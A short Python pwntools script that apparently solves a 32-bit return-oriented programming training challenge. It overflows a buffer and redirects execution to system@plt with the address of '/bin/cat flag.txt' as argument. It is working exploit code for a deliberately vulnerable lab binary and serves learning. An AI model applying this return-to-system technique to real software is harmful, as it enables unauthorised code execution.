from pwn import *

# Context, x86
context(arch = 'i386', os = 'linux', word_size = 32)

# Catch input from exe
io = process('split32')
print (io.recv())

# 0x0804a030 /bin/cat flag.txt
string = 0x0804a030

# 0x080483e0 system@plt
system_plt = 0x080483e0

buffer = b'A' * 44
buffer += p32(system_plt)
buffer += b'B' * 4
buffer += p32(string)

io.sendline(buffer)

print (io.recvall())

io.close()
